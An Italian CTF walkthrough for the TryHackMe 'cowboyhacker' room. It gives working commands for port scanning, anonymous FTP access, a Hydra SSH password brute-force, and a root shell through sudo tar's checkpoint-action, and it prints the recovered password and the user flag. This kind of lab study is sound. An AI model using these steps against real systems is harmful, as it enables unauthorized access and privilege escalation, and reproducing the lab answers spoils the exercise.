
#tryhackmelabs #laboratorio 

https://tryhackme.com/room/cowboyhacker

```
ping 10.10.36.11
```
ttl=64 (macchina linux)
ttl=128 (macchina windows)

```
sudo nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 10.10.36.11 -oG risultatoscan
```

```
sudo nmap -sC -sV -p21,22,80 10.10.36.11 -oN risultatoscan2
```

come si vede dal risultato c'è possibilità di  connettersi in modalità anonima  in ftp
```shell
ftp 10.10.36.11
```
ed entriamo con nome user:
```
anonymous
```
e *password vuota

ftp è passivo quindi fare
```
passive off
```

```
ls -l
```

```
less task.txt
```
==scritto da lin==
```
less locks.txt
```
scarichiamo i file con mget
```
mget *
```


searchsploit OpenSSH (è vulnerabile ma utilizziamo bruteforce hydra in quanto abbiamo trovato elenco password e nome utente)

```shell
hydra -l lin -P /home/kali/locks.txt 10.10.36.11 -t 4 ssh
```
password trovata 
```
RedDr4gonSynd1cat3
```

```
ssh lin@10.10.36.11
```

```
cat user.txt
```

```
THM{CR1M3_SyNd1C4T3}
```

```
find / -perm -4000 -ls 2>/dev/null
```
prima di Suid andiamo a vedere su che binario abbiamo i permessi di root
```
sudo -l
```
/bin/tar

https://gtfobins.github.io/#/bin/tar

```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```
whoami
```
siamo root!

```
cd /root
```

```
cat root.txt
```


```
THM{xxxxxxxxxxx}
```

